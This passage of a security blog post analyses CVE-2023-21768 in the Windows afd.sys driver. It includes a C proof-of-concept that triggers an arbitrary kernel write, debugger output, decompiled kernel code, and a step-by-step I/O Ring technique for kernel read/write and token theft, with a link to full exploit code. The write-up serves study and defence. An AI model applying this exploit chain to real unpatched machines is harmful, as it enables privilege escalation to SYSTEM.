+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> inbuf1 <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    inbuf1.Handle <span style="color:#f92672">=</span> CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (inbuf1.Handle) {
+</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> PostQueuedCompletionStatus(inbuf1.Handle, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, NULL);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;Error when queued completion status</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Error when create I/O completion port</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    inbuf1.List1 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    inbuf1.List2 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    inbuf1.CONTROLDATA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242</span>;
+</span></span><span style="display:flex;"><span>    inbuf1.Length1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>    inbuf1.DATA3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    inbuf1.Length2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WSADATA WSAData;
+</span></span><span style="display:flex;"><span>    SOCKET s;
+</span></span><span style="display:flex;"><span>    sockaddr_in sa;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ierr;
+</span></span><span style="display:flex;"><span>    WSAStartup(<span style="color:#ae81ff">0x2</span>, <span style="color:#f92672">&amp;</span>WSAData);
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>sa, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    sa.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">135</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    ierr <span style="color:#f92672">=</span> connect(s, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sa, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DeviceIoControl((HANDLE)s, <span style="color:#ae81ff">0X12127</span>, (LPVOID)<span style="color:#f92672">&amp;</span>inbuf1, <span style="color:#66d9ef">sizeof</span>(inbuf1), NULL, <span style="color:#ae81ff">0</span>, NULL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>During debugging, we see the execution successfully reaches the vulnerable instruction:</p>
+<pre tabindex="0"><code>3: kd&gt; p
+afd!AfdNotifyRemoveIoCompletion+0x260:
+fffff801`663dc8fc 8901            mov     dword ptr [rcx],eax
+3: kd&gt; rcx
+cx=4242
+3: kd&gt; rax
+ax=1
+</code></pre><h3 id="55-exploring-the-written-value">5.5 Exploring the Written Value</h3>
+<p>We can now consistently trigger the vulnerability. Based on the debugging output above, this vulnerability writes the value 1 to an arbitrary location. The next step is to determine if we can control/alter the value being written.</p>
+<p>The value <code>1</code> is the <code>num</code> parameter returned from the invocation of <code>IoRemoveIoCompletion(object_1, v5, mem_2, count, &amp;num, mode, pTimeout, 0)</code>.</p>
+<p>By inspecting the decompilation of <code>IoRemoveIoCompletion</code>, we find that this value is obtained from the return value of <code>KeRemoveQueueEx</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">IoRemoveIoCompletion</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_KQUEUE</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">__int64</span> a2, PLIST_ENTRY <span style="color:#f92672">*</span>EntryArray, ULONG Count, ULONG <span style="color:#f92672">*</span>outNum, KPROCESSOR_MODE a6, LARGE_INTEGER <span style="color:#f92672">*</span>Timeout, BOOLEAN a8)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  v10 <span style="color:#f92672">=</span> KeRemoveQueueEx(a1, a6, a8, Timeout, EntryArray, Count);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// note: v10 is not modified here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  result <span style="color:#f92672">=</span> v12;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>outNum <span style="color:#f92672">=</span> v10;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Within the <code>KeRemoveQueueEx</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>ULONG <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">KeRemoveQueueEx</span>(PKQUEUE Queue, KPROCESSOR_MODE WaitMode, BOOLEAN Alertable, PLARGE_INTEGER Timeout, PLIST_ENTRY <span style="color:#f92672">*</span>EntryArray, ULONG Count)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...
+</span></span><span style="display:flex;"><span>  rtn <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( Count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">&amp;</span>v27[<span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>].Blink <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> v27 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x80</span> <span style="color:#f92672">&amp;&amp;</span> v27 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xC0</span> <span style="color:#f92672">&amp;&amp;</span> BugCheckParameter2<span style="color:#f92672">-&gt;</span>Header.SignalState )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( BugCheckParameter2<span style="color:#f92672">-&gt;</span>Header.SignalState )
+</span></span><span style="display:flex;"><span>      rtn <span style="color:#f92672">=</span> (KiAttemptFastRemoveQueue)(BugCheckParameter2) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> rtn;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This implies that if the <code>Count</code> argument is <code>&lt;= 1</code>, <code>KeRemoveQueueEx</code> will always return 1. The <code>Count</code> argument is passed from the <code>Length2</code> field of our <code>AFD_NOTIFYSOCK_STRUCT</code> structure. In our initial PoC code, this field was set to 1, hence the written value was 1.</p>
+<p>As explained in <em>Windows Internals</em>, the <code>Count</code> parameter regulates the retrieval of multiple completion packets at once, meaning <code>KeRemoveQueueEx</code> can remove multiple elements from the queue in a single call.</p>
+<p>However, as shown in the code snippet, if <code>Count &gt; 1</code>, the return value of <code>KeRemoveQueueEx</code> is not guaranteed to be 1. To verify this, I modified <code>Length2</code> to 2 and invoked <code>PostQueuedCompletionStatus</code> twice to ensure there were two completion packets in the port&rsquo;s queue.</p>
+<p>Debugging confirmed that the written value indeed became 2.</p>
+<p>Through iterative testing, I confirmed that the written value changes in accordance with this pattern. Based on our analysis of <code>AFD_NOTIFYSOCK_STRUCT</code>, <code>Length2 * 32</code> represents the size of the buffer pointed to by <code>List2</code>. Theoretically, <code>Length2</code> merely needs to be smaller than <code>0x8000000</code> to avoid overflow. However, in practice, setting it to such a large value failed. I did not test the exact threshold value, but it is likely bound by undocumented checks or system resource limits, which I did not investigate further.</p>
+<h2 id="6-exploitation">6. Exploitation</h2>
+<p>The exploitation phase leverages the technique described in reference [2]. I relied entirely on the original article for this part; I still have much to learn regarding kernel exploitation.</p>
+<h3 id="61-io-ring-fundamentals">6.1 I/O Ring Fundamentals</h3>
+<p>The exploit takes advantage of a relatively new Windows feature called I/O Ring, where certain capabilities are only available starting with Windows 11 22H2+.</p>
+<p>In the I/O Ring model, the I/O manager creates a circular buffer in memory. This buffer allows multiple I/O operations to be queued simultaneously, enabling user-mode applications to execute batch I/O operations without incurring context switch overhead for each operation. The current implementation allows up to 0x10000 queued I/O operations.</p>
+<p>The Windows I/O Ring mechanism mimics Linux&rsquo;s <code>io_uring</code>, meaning their designs are very similar. Currently, I/O Ring does not support all types of I/O operations; Windows 11 22H2 supports read, write, flush, and cancel. Requested operations are written to a Submission Queue (SQ) and submitted together. The kernel processes these requests and writes the status codes to a Completion Queue (CQ). Both queues reside in a shared memory region accessible by both user-mode and kernel-mode, allowing data sharing without the overhead of multiple system calls.</p>
+<p>In addition to standard I/O operations, applications can queue two operations specific to I/O Rings: pre-registered buffers and pre-registered files. These allow applications to pre-open all file handles or pre-allocate all input/output buffers, register them, and then reference them by index. When the kernel processes an entry that utilizes a pre-registered handle or buffer, it fetches the requested handle/buffer from the pre-registered array and passes it to the I/O manager.</p>
+<p>Calling <code>CreateIoRing</code> returns a <code>HIORING</code> handle, which is actually a pointer to a <code>_HIORING</code> structure defined as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_HIORING</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE handle;
+</span></span><span style="display:flex;"><span>    NT_IORING_INFO Info;
+</span></span><span style="display:flex;"><span>    ULONG IoRingKernelAcceptedVersion;
+</span></span><span style="display:flex;"><span>    PVOID RegBufferArray;
+</span></span><span style="display:flex;"><span>    ULONG BufferArraySize;
+</span></span><span style="display:flex;"><span>    PVOID FileHandleArray;
+</span></span><span style="display:flex;"><span>    ULONG FileHandlesCount;
+</span></span><span style="display:flex;"><span>    ULONG SubQueueHead;
+</span></span><span style="display:flex;"><span>    ULONG SubQueueTail;
+</span></span><span style="display:flex;"><span>} HIORING, <span style="color:#f92672">*</span>PHIORING;
+</span></span></code></pre></div><p>In kernel-mode, the system instantiates an <code>IORING_OBJECT</code> structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IORING_OBJECT</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    USHORT Type;
+</span></span><span style="display:flex;"><span>    USHORT Size;
+</span></span><span style="display:flex;"><span>    NT_IORING_INFO UserInfo;
+</span></span><span style="display:flex;"><span>    PVOID Section;
+</span></span><span style="display:flex;"><span>    PNT_IORING_SUBMISSION_QUEUE SubmissionQueue;
+</span></span><span style="display:flex;"><span>    PMDL CompletionQueueMdl;
+</span></span><span style="display:flex;"><span>    PNT_IORING_COMPLETION_QUEUE CompletionQueue;
+</span></span><span style="display:flex;"><span>    ULONG64 ViewSize;
+</span></span><span style="display:flex;"><span>    BYTE InSubmit;
+</span></span><span style="display:flex;"><span>    ULONG64 CompletionLock;
+</span></span><span style="display:flex;"><span>    ULONG64 SubmitCount;
+</span></span><span style="display:flex;"><span>    ULONG64 CompletionCount;
+</span></span><span style="display:flex;"><span>    ULONG64 CompletionWaitUntil;
+</span></span><span style="display:flex;"><span>    KEVENT CompletionEvent;
+</span></span><span style="display:flex;"><span>    BYTE SignalCompletionEvent;
+</span></span><span style="display:flex;"><span>    PKEVENT CompletionUserEvent;
+</span></span><span style="display:flex;"><span>    ULONG RegBuffersCount;
+</span></span><span style="display:flex;"><span>    PIOP_MC_BUFFER_ENTRY RegBuffers;
+</span></span><span style="display:flex;"><span>    ULONG RegFilesCount;
+</span></span><span style="display:flex;"><span>    PVOID<span style="color:#f92672">*</span> RegFiles;
+</span></span><span style="display:flex;"><span>} IORING_OBJECT, <span style="color:#f92672">*</span>PIORING_OBJECT;
+</span></span></code></pre></div><p>Except for the <code>HIORING</code> structure, the other structural definitions are present in the symbol files and can be inspected via WinDbg. Note the <code>RegBuffers</code> field in the <code>_IORING_OBJECT</code> structure. On my test machine running Windows 11 22H2 (Build 22621.963), this field is of type <code>PIOP_MC_BUFFER_ENTRY</code>. However, prior to Windows 11 build 22610, this field was of type <code>PIORING_BUFFER_INFO</code>. Consequently, exploitation steps vary slightly depending on the version. Refer to reference [2] for details.</p>
+<h3 id="62-exploitation-principles">6.2 Exploitation Principles</h3>
+<p>When processing I/O requests, the I/O manager will:</p>
+<ol>
+<li>Check the <code>Sqe-&gt;RegisterBuffers.Buffers</code> and <code>Sqe-&gt;RegisterBuffers.Count</code> fields of the Submission Queue Entry (SQE);</li>
+<li>If the request originates from user-mode, verify whether the pre-registered buffers reside entirely in user-mode and satisfy size requirements;</li>
+<li>Allocate a new space in the kernel pool and point <code>IoRing-&gt;RegBuffers</code> to this space;</li>
+<li>Verify that each entry in the pre-allocated buffer resides in user-mode, then copy them to the newly allocated kernel pool memory.</li>
+</ol>
+<p>The steps above are simplified and do not account for pre-existing pre-allocated buffers, but they suffice for explaining the core exploit primitive (refer to [2] for details).</p>
+<p>Importantly, the system does not validate the address of the <code>RegBuffers</code> pointer itself. If we have a kernel write vulnerability (like our arbitrary write), we can overwrite the <code>IoRing-&gt;RegBuffers</code> field to point to a fake buffer structure that we control in user-mode. Consequently, subsequent I/O operations using this pre-registered buffer index will allow us to read or write arbitrary kernel memory. The layout is illustrated in the diagram below:</p>
+<p><img src="/img/2023-04-19-10-38-53.png" alt=""></p>
+<h3 id="63-exploitation-workflow">6.3 Exploitation Workflow</h3>
+<ol>
+<li>Create two named pipe server instances using <code>CreateNamedPipe</code> and connect to them with clients created via <code>CreateFile</code>. These pipes represent the two files shown in the diagram above.</li>
+<li>Initialize an I/O Ring using <code>CreateIoRing</code> to obtain a <code>_HIORING*</code> handle (referred to as <code>HIORING</code>).</li>
+<li>Construct a fake buffer structure in user-mode, which will subsequently overwrite <code>RegBuffers</code> in kernel space and <code>RegBufferArray</code> in <code>HIORING</code>.</li>
+<li>Locate the corresponding <code>IORING_OBJECT</code> kernel object for <code>HIORING</code>. This is achieved by invoking <code>NtQuerySystemInformation</code> to retrieve system handle tables.</li>
+<li>Trigger the kernel write exploit to modify the <code>RegBuffersCount</code> and <code>RegBuffers</code> fields within <code>IORING_OBJECT</code>, while simultaneously patching <code>RegBufferArray</code> and <code>BufferArraySize</code> in the user-mode <code>HIORING</code> structure.</li>
+<li>Modify the relevant fields of the <code>IORING_BUFFER_INFO</code> structure stored at index 0 (or any chosen index) of the fake buffer to point to the target kernel address and size we wish to read/write. This step also requires calling <code>NtQuerySystemInformation</code> to obtain the kernel token addresses for both the target process (e.g., System) and the current process.</li>
+<li>Use <code>BuildIoRingReadFile</code> or <code>BuildIoRingWriteFile</code> to perform arbitrary reads and writes in kernel memory space.</li>
+</ol>
+<p>The exploit code is available on <a href="https://github.com/zoemurmure/CVE-2023-21768-AFD-for-WinSock-EoP-exploit">GitHub</a>.</p>
+<h2 id="7-conclusion">7. Conclusion</h2>
+<p>Overall, except for the advanced concepts involved in exploitation, the topics discussed in this article are within my technical grasp. At a minimum, I should have been capable of writing the PoC code. Nonetheless, I remain uncertain if I could have successfully navigated the entire analysis without the original article&rsquo;s guidance.</p>
+<p>Reflecting on this, the reason my analysis proceeded so smoothly was the psychological comfort of knowing that success was possible. Since a pioneer&rsquo;s write-up existed, and it was relatively concise, I knew that dedicating sufficient time would lead to the destination. Thus, I could focus entirely on the analysis without distraction.</p>
+<p>However, if I were presented with only <code>afd.sys</code> from scratch, I might have started doubting myself as early as Section 5.1. I would have likely searched aimlessly for various documentation, gotten sidetracked by secondary concepts, and ultimately failed to complete the vulnerability analysis.</p>
+<p>Returning to the vulnerability itself, the analysis is indeed quite straightforward: the patch involves minimal code modifications, the call chain to the vulnerable function is short and direct, and there is already some analysis material on AFD available online. By contrast, the I/O Ring exploitation technique is fascinating. As a recently introduced Windows feature, the write primitive is only fully realized in Windows 11 22H2, and the fields of its internal data structures continue to evolve. It will be interesting to watch whether Microsoft refines the way pre-allocated buffers are managed in future updates.</p>
+<h2 id="8-references">8. References</h2>
+<ol>
+<li><a href="https://securityintelligence.com/posts/patch-tuesday-exploit-wednesday-pwning-windows-ancillary-function-driver-winsock/">Patch Tuesday -&gt; Exploit Wednesday: Pwning Windows Ancillary Function Driver for WinSock (afd.sys) in 24 Hours</a></li>
+<li><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11</a></li>
+<li><a href="https://windows-internals.com/one-year-to-i-o-ring-what-changed/">One Year to I/O Ring: What Changed?</a></li>
+<li><a href="https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/">I/O Rings – When One I/O Operation is Not Enough</a></li>
+</ol>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5 0 11V3C0 1.5.8.8.8.8S1.5 0 3 0h8c1.5 0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/cve/" rel="tag">cve</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/binary/" rel="tag">binary</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/exploit/" rel="tag">exploit</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+
+
+
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2026 Logic Security.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
